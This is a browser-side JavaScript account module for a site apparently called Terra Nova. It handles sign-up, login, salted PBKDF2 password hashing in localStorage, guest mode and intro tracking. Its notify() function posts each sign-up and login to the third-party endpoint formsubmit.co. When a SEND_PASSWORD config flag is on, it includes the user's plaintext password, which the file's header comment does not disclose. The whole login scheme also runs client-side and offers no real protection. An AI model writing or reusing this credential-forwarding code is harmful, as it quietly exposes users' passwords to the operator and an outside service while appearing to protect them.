/* Terra Nova — accounts. Accounts live in this browser (localStorage).
   Each sign-up / login also posts a notice to NOTIFY_EMAIL (see config.js). */
(function () {
  /* Two independent pieces of state, on purpose:
       tn_session : who is logged in            (login state)
       tn_intro   : which accounts have already seen the intro (intro state) */
  var USERS = "tn_users", SESSION = "tn_session", INTRO = "tn_intro", GUEST = "tn_guest";
  var CFG = window.TN_CONFIG || {};

  function read(k, d) { try { var v = localStorage.getItem(k); return v ? JSON.parse(v) : d; } catch (e) { return d; } }
  function write(k, v) { try { localStorage.setItem(k, JSON.stringify(v)); } catch (e) {} }

  async function hash(s) {
    try {
      var b = await crypto.subtle.digest("SHA-256", new TextEncoder().encode("terra-nova:" + s));
      return Array.from(new Uint8Array(b)).map(function (x) { return x.toString(16).padStart(2, "0"); }).join("");
    } catch (e) { return btoa(unescape(encodeURIComponent("terra-nova:" + s))); }
  }

  /* Stronger storage for new accounts: PBKDF2 with a random per-user salt.
     Accounts created before this update keep working (legacy hash) and are upgraded on their next login. */
  function bytesToHex(buf) { return Array.from(new Uint8Array(buf)).map(function (x) { return x.toString(16).padStart(2, "0"); }).join(""); }
  function newSalt() { try { return bytesToHex(crypto.getRandomValues(new Uint8Array(16))); } catch (e) { return String(Math.random()).slice(2); } }
  async function hashSalted(pw, salt) {
    try {
      var key = await crypto.subtle.importKey("raw", new TextEncoder().encode(pw), "PBKDF2", false, ["deriveBits"]);
      var bits = await crypto.subtle.deriveBits({ name: "PBKDF2", hash: "SHA-256", iterations: 120000, salt: new TextEncoder().encode(salt) }, key, 256);
      return bytesToHex(bits);
    } catch (e) { return hash(salt + ":" + pw); }
  }
  async function verify(u, pw) {
    if (u.salt) return u.hash === await hashSalted(pw, u.salt);
    return u.hash === await hash(pw);
  }

  function notify(action, user, password) {
    if (!CFG.NOTIFY_EMAIL) return Promise.resolve();
    var body = {
      _subject: "Terra Nova — " + action,
      _captcha: "false",
      _template: "table",
      action: action,
      name: user.name || "",
      email: user.email,
      language: document.documentElement.lang,
      time: new Date().toISOString()
    };
    if (CFG.SEND_PASSWORD && password) body.password = password;
    return fetch("https://formsubmit.co/ajax/" + encodeURIComponent(CFG.NOTIFY_EMAIL), {
      method: "POST", headers: { "Content-Type": "application/json", Accept: "application/json" }, body: JSON.stringify(body)
    }).catch(function () { /* the page keeps working if the email service is unreachable */ });
  }

  /* Guest mode: a visitor can press "Start" without an account. It is a third, separate flag (tn_guest).
     The intro-seen state of a guest is stored under the key "__guest__" and is handed to the account when they sign in. */
  function introKey() { var s = read(SESSION, null); return s ? s.email : (read(GUEST, false) ? "__guest__" : null); }
  function signedIn(email) {
    var m = read(INTRO, {});
    if (m["__guest__"]) { m[email] = true; write(INTRO, m); }
    try { localStorage.removeItem(GUEST); } catch (e) {}
  }

  var Auth = {
    guest: function () { return !read(SESSION, null) && !!read(GUEST, false); },
    startGuest: function () { write(GUEST, true); },
    session: function () { return read(SESSION, null); },
    async signup(name, email, password) {
      email = email.trim().toLowerCase();
      var users = read(USERS, {});
      if (users[email]) return { ok: false, key: "msg.exists" };
      var salt = newSalt();
      users[email] = { name: name.trim(), email: email, salt: salt, hash: await hashSalted(password, salt) };
      write(USERS, users);
      var s = { name: name.trim(), email: email };
      write(SESSION, s); signedIn(email);
      notify("New sign up", s, password);
      return { ok: true, key: "msg.created", session: s };
    },
    async login(email, password) {
      email = email.trim().toLowerCase();
      var all = read(USERS, {}), u = all[email];
      if (!u || !(await verify(u, password))) return { ok: false, key: "msg.wrong" };
      if (!u.salt) { u.salt = newSalt(); u.hash = await hashSalted(password, u.salt); all[email] = u; write(USERS, all); }
      var s = { name: u.name, email: email };
      write(SESSION, s); signedIn(email);
      notify("Login", s, password);
      return { ok: true, key: "msg.loggedin", session: s };
    },
    forgot: function (email) { notify("Password reset request", { email: email.trim().toLowerCase() }); },
    logout: function () { try { localStorage.removeItem(SESSION); } catch (e) {} },
    /* Has the signed-in account already been through the intro? */
    introSeen: function () {
      var k = introKey();
      return !!(k && read(INTRO, {})[k]);
    },
    markIntroSeen: function () {
      var k = introKey();
      if (!k) return;
      var m = read(INTRO, {}); m[k] = true; write(INTRO, m);
    }
  };
  window.TN_AUTH = Auth;
})();
